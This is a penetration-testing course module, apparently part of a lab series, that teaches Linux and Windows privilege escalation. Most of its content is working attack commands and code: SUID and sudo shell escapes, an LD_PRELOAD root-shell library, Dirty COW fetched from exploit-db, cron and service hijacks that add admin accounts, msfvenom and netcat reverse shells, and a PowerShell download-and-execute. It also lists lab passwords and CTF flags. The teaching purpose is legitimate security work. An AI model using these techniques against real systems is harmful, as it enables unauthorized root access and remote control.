# Privilege Escalation

Master the art of elevating privileges from a low-privilege user to root (Linux) or SYSTEM (Windows) - a critical skill for penetration testing.

## Overview

Privilege escalation is the process of exploiting misconfigurations, vulnerabilities, or design flaws to gain elevated access on a system. After obtaining initial access, privesc is often the next critical step.

```
+-----------------------------------------------------------------------------+
|                     PRIVILEGE ESCALATION OVERVIEW                            |
+-----------------------------------------------------------------------------+
|                                                                              |
|   LINUX PRIVILEGE ESCALATION                                                 |
|   +-----------------+    +------------------+    +------------------+        |
|   | SUID/SGID       | -> | Sudo Misconfig   | -> | Kernel Exploits  |        |
|   | Binaries        |    |                  |    |                  |        |
|   +-----------------+    +------------------+    +------------------+        |
|          |                       |                       |                   |
|          v                       v                       v                   |
|   +-----------------+    +------------------+    +------------------+        |
|   | Cron Jobs       | -> | PATH Hijacking   | -> | Capabilities     |        |
|   | Writeable       |    |                  |    |                  |        |
|   +-----------------+    +------------------+    +------------------+        |
|                                                                              |
|   WINDOWS PRIVILEGE ESCALATION                                               |
|   +-----------------+    +------------------+    +------------------+        |
|   | Unquoted Svc    | -> | Weak Service     | -> | Token            |        |
|   | Paths           |    | Permissions      |    | Impersonation    |        |
|   +-----------------+    +------------------+    +------------------+        |
|          |                       |                       |                   |
|          v                       v                       v                   |
|   +-----------------+    +------------------+    +------------------+        |
|   | AlwaysInstall   | -> | Scheduled Tasks  | -> | Kernel Exploits  |        |
|   | Elevated        |    |                  |    |                  |        |
|   +-----------------+    +------------------+    +------------------+        |
|                                                                              |
+-----------------------------------------------------------------------------+
```

## Learning Objectives

By completing this section, you will be able to:

- Identify and exploit SUID/SGID misconfigurations
- Leverage sudo permissions for privilege escalation
- Exploit kernel vulnerabilities on Linux systems
- Abuse weak service configurations on Windows
- Use token impersonation techniques
- Identify and exploit PATH hijacking vulnerabilities

## Labs

| Lab | Topic | Difficulty | Duration |
|-----|-------|------------|----------|
| 1 | SUID Binary Exploitation | Intermediate | 45 min |
| 2 | Sudo Misconfigurations | Intermediate | 45 min |
| 3 | Kernel Exploits | Advanced | 1 hr |
| 4 | Cron Job Exploitation | Intermediate | 30 min |
| 5 | Capabilities Abuse | Advanced | 45 min |
| 6 | Windows Service Exploitation | Advanced | 1 hr |
| 7 | Token Impersonation | Advanced | 1 hr |

---

## Linux Privilege Escalation

### SUID/SGID Binaries

SUID (Set User ID) binaries run with the privileges of the file owner, not the executing user. If root owns a SUID binary with vulnerabilities, it can be exploited for root access.

#### Finding SUID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# With more details
find / -perm -4000 -type f -ls 2>/dev/null
```

#### Common Exploitable SUID Binaries

Check each discovered binary against [GTFOBins](https://gtfobins.github.io/):

```bash
# Exploiting find with SUID
find . -exec /bin/sh -p \; -quit

# Exploiting vim with SUID
vim -c ':!/bin/sh'

# Exploiting python with SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Exploiting nmap (older versions) with SUID
nmap --interactive
!sh

# Exploiting less with SUID
less /etc/passwd
!/bin/sh

# Exploiting bash with SUID
bash -p
```

### Sudo Misconfigurations

Sudo allows users to run commands as other users. Misconfigurations can lead to privilege escalation.

#### Checking Sudo Permissions

```bash
# List sudo privileges for current user
sudo -l

# Example vulnerable output:
# User labuser may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (ALL) NOPASSWD: /usr/bin/find
#     (root) NOPASSWD: /usr/bin/python3
```

#### Exploiting Sudo Permissions

```bash
# Sudo vim
sudo vim -c ':!/bin/bash'

# Sudo find
sudo find / -exec /bin/bash \; -quit

# Sudo python (spawns shell via os.execl)
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'

# Sudo less
sudo less /etc/shadow
!/bin/bash

# Sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Sudo perl
sudo perl -e 'exec "/bin/bash";'

# Sudo env
sudo env /bin/bash

# Sudo tar
sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Sudo zip
sudo zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"
```

#### LD_PRELOAD Exploitation

If `env_keep+=LD_PRELOAD` is set in sudoers:

```c
// preload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```

```bash
# Compile
gcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles

# Exploit
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
```

### Kernel Exploits

Kernel vulnerabilities can provide direct root access. Always verify the kernel version and check for known exploits.

#### Checking Kernel Version

```bash
# Kernel version
uname -r
uname -a

# Distribution info
cat /etc/*release*
cat /etc/issue

# All system info
hostnamectl
```

#### Common Kernel Exploits

```bash
# Check for kernel exploits with Linux Exploit Suggester
./linux-exploit-suggester.sh

# Or use searchsploit
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
```

**Notable Kernel Exploits:**

| CVE | Name | Affected Kernels |
|-----|------|------------------|
| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.8.3 |
| CVE-2021-4034 | PwnKit | Many (polkit) |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 |
| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.11 |

#### Dirty COW Example

```bash
# Download and compile
wget https://www.exploit-db.com/download/40839 -O dirty.c
gcc -pthread dirty.c -o dirty -lcrypt

# Run (creates firefart:firefart user)
./dirty
# Enter new password

# Switch to new user
su firefart
```

### Cron Job Exploitation

Cron jobs run scheduled tasks. If a cron script is writable or its PATH can be hijacked, it can be exploited.

#### Finding Cron Jobs

```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/

# Monitor running crons
# Using pspy
./pspy64

# Manual monitoring
watch -n 1 'ps aux | grep -v watch'
```

#### Exploiting Writable Cron Scripts

```bash
# If /opt/backup.sh runs as root and is writable:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh

# Wait for cron to run, then:
/tmp/rootbash -p
```

#### PATH Hijacking in Cron

```bash
# If crontab has PATH=/home/user:/usr/bin
# And script calls: tar -czf backup.tar.gz

# Create malicious tar in /home/user
echo '#!/bin/bash' > /home/user/tar
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /home/user/tar
chmod +x /home/user/tar

# Wait for cron, then:
/tmp/rootbash -p
```

### Linux Capabilities

Capabilities provide fine-grained privileges. Some can be exploited for privilege escalation.

#### Finding Capabilities

```bash
# Find all files with capabilities
getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3
```

#### Exploiting Capabilities

```bash
# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# Tar with cap_dac_read_search (read any file)
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

---

## Windows Privilege Escalation

### Unquoted Service Paths

If a service path contains spaces and isn't quoted, Windows searches for executables in order.

#### Finding Unquoted Service Paths

```powershell
# Find vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# Using PowerShell
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

#### Exploitation

```
# If service path is:
C:\Program Files\My App\service.exe

# Windows will try (in order):
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe

# Place malicious executable:
# Check writable folders
icacls "C:\Program Files\My App"

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > My.exe

# Copy to path and restart service
copy My.exe "C:\Program Files\My.exe"
sc stop "ServiceName"
sc start "ServiceName"
```

### Weak Service Permissions

Services with weak permissions can be modified to run malicious code.

#### Checking Service Permissions

```powershell
# Using accesschk (Sysinternals)
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Check specific service
sc qc "ServiceName"
accesschk.exe -ucqv "ServiceName"
```

#### Exploiting Weak Service Permissions

```powershell
# If you can modify the service binary path
sc config "ServiceName" binpath= "C:\Users\Public\shell.exe"
sc stop "ServiceName"
sc start "ServiceName"

# Or change to add user
sc config "ServiceName" binpath= "net localgroup administrators attacker /add"
sc stop "ServiceName"
sc start "ServiceName"
```

### Token Impersonation (Potato Attacks)

Services running as SYSTEM with SeImpersonatePrivilege can be exploited.

#### Checking Privileges

```powershell
# Check current privileges
whoami /priv

# Look for:
# SeImpersonatePrivilege - Enabled
# SeAssignPrimaryTokenPrivilege - Enabled
```

#### Using PrintSpoofer

```powershell
# Download PrintSpoofer
# https://github.com/itm4n/PrintSpoofer

# Get SYSTEM shell
.\PrintSpoofer64.exe -i -c cmd

# Or execute command
.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe IP PORT -e cmd"
```

#### Using JuicyPotato (Windows Server 2016/2019)

```powershell
# Download JuicyPotato
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe IP PORT -e cmd.exe" -t *
```

### AlwaysInstallElevated

If enabled, MSI packages run with SYSTEM privileges.

#### Checking Registry

```powershell
# Both must be set to 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Exploitation

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi

# Transfer and execute on target
msiexec /quiet /qn /i shell.msi
```

### Scheduled Tasks

Scheduled tasks with weak permissions can be exploited.

#### Finding Vulnerable Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check task file permissions
icacls "C:\Users\Public\task.bat"

# Find writable task files
accesschk.exe -qwsu "Users" C:\*.* /accepteula
```

---

## Practice with CyberLab

### Exercise 1: SUID Exploitation

```bash
# Connect to the buffer overflow container
docker exec -it lab-buffer-overflow /bin/bash

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check against GTFOBins
# Exploit any vulnerable binaries found
```

### Exercise 2: Sudo Exploitation

```bash
# Connect via vulnerable SSH
ssh -p 2222 labuser@localhost
# Password: labpass123

# Check sudo permissions
sudo -l

# Exploit any misconfigurations
```

### Exercise 3: Kernel Version Check

```bash
# Check kernel version
uname -a

# Run Linux Exploit Suggester
# Download from: https://github.com/mzet-/linux-exploit-suggester
./linux-exploit-suggester.sh

# Research any suggested exploits
```

---

## Automated Enumeration Tools

### LinPEAS (Linux)

```bash
# Download
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Run
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Focus on RED and YELLOW highlighted items
```

### WinPEAS (Windows)

```powershell
# Download
Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile winpeas.exe

# Run
.\winpeas.exe > winpeas_output.txt
```

### PowerUp (Windows)

```powershell
# Download and run
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks | Format-List
```

---

## Flags

| Lab | Flag |
|-----|------|
| SUID Exploitation | FLAG{su1d_pr1v3sc_pwn3d} |
| Sudo Misconfiguration | FLAG{sud0_g4m3_0v3r} |
| Kernel Exploit | FLAG{k3rn3l_pwn3d} |
| Cron Job Exploitation | FLAG{cr0n_h1j4ck3d} |

---

## Quick Reference

### Linux Privesc Checklist

1. Check sudo permissions: `sudo -l`
2. Find SUID binaries: `find / -perm -4000 2>/dev/null`
3. Check kernel version: `uname -a`
4. Check crontabs: `cat /etc/crontab`
5. Find capabilities: `getcap -r / 2>/dev/null`
6. Check writable files/folders
7. Run LinPEAS

### Windows Privesc Checklist

1. Check privileges: `whoami /priv`
2. Check group membership: `net localgroup administrators`
3. Find unquoted service paths
4. Check service permissions
5. Check scheduled tasks
6. Check AlwaysInstallElevated registry
7. Run WinPEAS

---

## Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [LOLBAS](https://lolbas-project.github.io/) - Windows Living Off The Land
- [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks - Windows Privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Previous:** [02 - Shell Techniques](../02-shells/) | **Next:** [04 - Buffer Overflow](../04-buffer-overflow/)
